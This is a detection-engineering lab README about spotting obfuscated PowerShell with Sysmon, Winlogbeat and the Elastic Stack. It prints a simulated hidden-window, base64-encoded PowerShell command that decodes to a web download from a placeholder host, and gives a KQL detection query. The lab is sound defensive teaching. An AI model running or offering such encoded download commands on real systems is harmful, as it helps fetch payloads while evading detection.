# SOC Detection Lab: Detecting Obfuscated PowerShell with Sysmon + ELK

Welcome to a hands-on **SOC detection engineering lab** that simulates real-world attacker behavior using **encoded PowerShell** and walks through how to detect it using **Sysmon**, **Winlogbeat**, and the **Elastic Stack** (ELK).

> This project was created to showcase my ability to simulate attacks, analyze telemetry, and build real-world detections as a SOC analyst or detection engineer.

---

## Lab Objective

- Simulate **obfuscated PowerShell execution** with `-EncodedCommand`
- Investigate endpoint logs using **Sysmon**
- Ship logs to a central SIEM using **Winlogbeat**
- Detect malicious behavior using **KQL and Sigma rules**

## Simulated Attack

powershell
    powershell.exe -nop -w hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAGUAbQBvAGMAawAvAGQAbwB3AG4AcwBjAHIAaQBwAHQAIgA=

Decoded Command:
    Invoke-WebRequest "http://emock/downloadscript"

## Detection Strategy 

| Technique | Description |
|----------|-------------|
| T1059.001 | Powershell |
| T1027 | Obfuscation |
| T1105 | Remote File Copy |

## KQL Detection (Kibana):

process.name: "powershell.exe" AND process.command_line: "*-EncodedCommand*"

## Sigma Rule:
    detections/powershell-encodedcommand.yml

## Status

Lab is complete!

Future Ideas:
    Add detection for Powershell downloading via iex (New-Object Net.WebClient)
    Add alerting rule in Elastic Security
    Build out GRC-style executive report from this analysis
